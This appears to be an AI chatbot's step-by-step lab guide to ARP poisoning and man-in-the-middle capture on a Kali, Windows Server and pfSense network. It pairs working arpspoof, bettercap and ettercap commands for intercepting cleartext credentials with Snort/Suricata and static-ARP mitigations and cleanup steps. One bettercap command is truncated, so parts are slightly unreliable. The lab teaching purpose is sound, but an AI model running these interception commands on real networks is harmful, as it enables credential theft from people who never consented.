# Pre-lab checklist (do this first)

1. Ensure all VMs/hosts are on the same lab LAN and isolated from production/internet (or use an isolated VLAN).
2. Snapshot/backup the Windows Server and pfSense VMs so you can revert if things go wrong.
3. On Windows Server, open an elevated PowerShell/Command Prompt.
4. On Kali, update and install tools if needed:

```bash
sudo apt update
sudo apt install bettercap dsniff arpspoof tcpdump wireshark -y
```

(you can use `bettercap` or `arpspoof`/`ettercap` per your preference). Bettercap docs are a good reference. ([bettercap][1])

---

# Task 1 — Verify normal communication (baseline)

Goal: confirm normal ARP/ICMP behavior before the attack.

On Windows Server:

1. Ping pfSense gateway (replace `GATEWAY_IP`):

```powershell
ping -n 4 GATEWAY_IP
```

Expected: 4 replies with low latency.

2. Record current gateway MAC:

```powershell
arp -a GATEWAY_IP
```

Expected output example:

```
Interface: 192.168.1.10 --- 0x6
  Internet Address      Physical Address      Type
  192.168.1.1           00-11-22-33-44-55     dynamic
```

Note the MAC (00-11-22-33-44-55 in example).

On Kali (capture ARP traffic):

1. Start tcpdump for ARP only:

```bash
sudo tcpdump -i <iface> arp -n -vv
```

Or use Wireshark and filter `arp`.
Expected: you’ll see ARP requests from Windows asking “Who has GATEWAY\_IP?” and ARP replies from pfSense with its MAC. PfSense ARP table is viewable in Diagnostics > ARP Table. ([Netgate Documentation][2])

---

# Task 2 — Perform ARP poisoning (lab only)

Goal: poison ARP caches so traffic flows via Kali. (Use only in lab.)

**Important:** enable IP forwarding on Kali so it forwards traffic between victim and gateway:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
# Or persist for session:
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

Two common ways:

## A — Using `arpspoof` (from dsniff)

On Kali:

```bash
# Replace <WIN_IP> and <GW_IP> and <iface>
sudo arpspoof -i <iface> -t <WIN_IP> <GW_IP>    # tell WIN that Kali is GW
sudo arpspoof -i <iface> -t <GW_IP>  <WIN_IP>  # tell GW that Kali is WIN
```

Run both (in separate terminals). After these run, Windows and pfSense will believe Kali’s MAC belongs to the other system.

## B — Using Bettercap (recommended modern tool)

A simple bettercap session:

```bash
sudo bettercap -iface <iface> --no-
# inside bettercap interactive:
net.probe on
arp.spoof on
set arp.spoof.targets <WIN_IP>,<GW_IP>
```

Bettercap docs and guides cover switches/features. ([bettercap][1])

**Verify poisoning (live):**
On Windows:

```powershell
arp -a GATEWAY_IP
```

Expected: the MAC for `GATEWAY_IP` should now match Kali’s MAC address.

On pfSense: Diagnostics > ARP Table should show the victim IP with Kali’s MAC (if you poisoned gateway’s cache too). You can also watch arp packets on Kali tcpdump:

```bash
sudo tcpdump -i <iface> arp -n -vv
```

You should see gratuitous ARP replies from Kali (spoofed).

---

# Task 3 — MITM data capture

Goal: capture HTTP cleartext credentials and inspect traffic.

On Kali, capture traffic:

* With Wireshark: start capturing on `<iface>`; use display filter:

```
ip.addr == <WIN_IP> && ip.addr == <GW_IP>
```

* With tcpdump to a pcap:

```bash
sudo tcpdump -i <iface> -w mitm_capture.pcap host <WIN_IP> and host <GW_IP>
```

* Using `ettercap` (text mode):

```bash
sudo ettercap -T -q -M arp:remote /<WIN_IP>/ /<GW_IP>/
```

* Or Bettercap modules (http.proxy, etc.) to inspect/modify flows. See Bettercap docs. ([bettercap][1])

**Browse from Windows**: open a browser and visit an HTTP site (not HTTPS) or a purposely vulnerable test site used for labs (e.g., an internal web app). In Wireshark you can filter for HTTP:

```
http.request or http contains "POST"
```

Or search for `username`, `password`, or `Authorization` headers in packet details.

**Important note:** Most real sites use HTTPS. For HTTPS you’ll only see encrypted traffic unless you do SSL-stripping or install a fake CA — which is more invasive and dangerous. In a lab, use an intentionally unencrypted test site.

---

# Task 4 — Observe the impact (evidence)

1. On Windows: `arp -a` before vs after — compare MACs. After poisoning, gateway MAC = Kali MAC.
2. On pfSense: Diagnostics > ARP Table to see if the victim IP shows Kali’s MAC. (pfSense ARP table docs). ([Netgate Documentation][2])
3. On Kali: confirm forwarded traffic via `tcpdump` or `iftop` showing flows between the two IPs.

Example verification commands:

* On Windows (before):

```powershell
arp -a GATEWAY_IP
# Save output to file:
arp -a > before_arp.txt
```

* After poisoning:

```powershell
arp -a > after_arp.txt
# Compare
fc before_arp.txt after_arp.txt   # Windows file compare
```

---

# Task 5 — Mitigation with pfSense (detection + blocking)

Goal: show how to detect and block ARP spoofing using pfSense IDS/IPS and static protections.

## 1) Install Snort or Suricata package (pfSense GUI)

* System > Package Manager > Available Packages → install **Snort** or **Suricata**.
* Configure the package on the LAN interface, enable logging, choose appropriate rule sets, and enable blocking mode if desired. The official pfSense docs explain configuring Snort/Suricata on pfSense. ([Netgate Documentation][3])

**Notes**:

* Snort/Suricata can detect suspicious ARP patterns (some rules preprocessor or rules exist for ARP spoofing); you may need to tune/pre-load ARP-specific rules or use an advanced config for `arpspoof_detect_host` (Snort advanced config). Community posts discuss adding `preprocessor arpspoof` lines. ([Netgate Forum][4])

## 2) Static ARP / DHCP Static Mappings

* Use DHCP static mappings or “Static ARP entries” on the interface to bind IP → MAC for known devices (this reduces acceptance of unknown ARP replies to pfSense). pfSense’s Static ARP behavior is documented — enabling static ARP restricts communication to only those mappings, so use carefully in labs. ([Netgate Forum][5])

Where to check:

* Services > DHCP Server > Static ARP (or use DHCP static mappings); System > Advanced has some ARP options depending on pfSense version.

## 3) Additional mitigations and good practice

* Use port security on switches (lock MAC to port) if lab switch supports it (prevents other ports from spoofing).
* Enable logging/alerts on the IDS and review alerts during the attack run — the IDS should log ARP anomalies if rules are enabled. Community threads show users adding ARP detection rules to Snort/Suricata. ([Netgate Forum][4])

---

# Cleanup (restore network)

On Kali:

```bash
# Stop arpspoof/bettercap sessions
sudo pkill arpspoof
# or stop bettercap: in its console `arp.spoof off` then exit
# Disable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

On Windows:

```powershell
# Clear ARP cache
arp -d *
# or reboot Windows server
```

On pfSense:

* Clear ARP entries (Diagnostics > ARP Table) or reboot pfSense if necessary.

---

# Expected outputs & troubleshooting tips

* If poisoning succeeded, Windows `arp -a` will show Kali’s MAC for GATEWAY\_IP.
* If you cannot see traffic: ensure interface promiscuous mode is enabled and that Kali is on the same L2 segment (same switch/VLAN).
* If pfSense uses static ARP or DHCP static mappings, poisoning may fail — that’s the point of the mitigation.

---

# Safe-lab warnings & ethics

* Only perform these actions on equipment/networks you own or explicitly have permission to test. Performing MITM/ARP poisoning on networks without permission is illegal and unethical.
* Use snapshots and isolated lab networks. Revert VMs after tests if needed. Many guides emphasize ethical lab use. ([WebAsha][6])

---

# Quick reference (commands summary)

* Enable IP forward:

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

* arpspoof:

```bash
sudo arpspoof -i <iface> -t <WIN_IP> <GW_IP>
sudo arpspoof -i <iface> -t <GW_IP>  <WIN_IP>
```

* bettercap minimal:

```bash
sudo bettercap -iface <iface>
# then in session:
net.probe on
set arp.spoof.targets <WIN_IP>,<GW_IP>
arp.spoof on
```

* capture with tcpdump:

```bash
sudo tcpdump -i <iface> -w mitm.pcap host <WIN_IP> and host <GW_IP>
```

* Wireshark display filters:

```
arp
ip.addr==<WIN_IP> && ip.addr==<GW_IP>
http
```

* pfSense: Install Snort/Suricata via System > Package Manager; view ARP table at Diagnostics > ARP Table. ([Netgate Documentation][3])

---

If you want, I can:

* Produce a one-page printable checklist you can use in the lab (I can format as a markdown or PDF).
* Provide a sample Snort `arpspoof` preprocessor snippet and where to add it in pfSense (advanced Snort config) so that pfSense flags poisoning (I can draft the exact Snort lines). ([Netgate Forum][4])

Which of those would you like next?

[1]: https://www.bettercap.org/legacy/?utm_source=chatgpt.com "BetterCAP stable documentation"
[2]: https://docs.netgate.com/pfsense/en/latest/monitoring/status/arp.html?utm_source=chatgpt.com "ARP Table | pfSense Documentation"
[3]: https://docs.netgate.com/pfsense/en/latest/packages/snort/setup.html?utm_source=chatgpt.com "Configuring the Snort Package | pfSense Documentation"
[4]: https://forum.netgate.com/topic/17813/snort-and-arp-spoofing?utm_source=chatgpt.com "Snort and arp spoofing"
[5]: https://forum.netgate.com/topic/182399/enable-static-arp-entries-not-working-correctly?utm_source=chatgpt.com "Enable Static ARP entries not working correctly"
[6]: https://www.webasha.com/blog/understanding-man-in-the-middle-attacks-a-step-by-step-guide-using-bettercap?utm_source=chatgpt.com "Understanding Man-in-the-Middle Attacks: A Step-by-Step Guide ..."
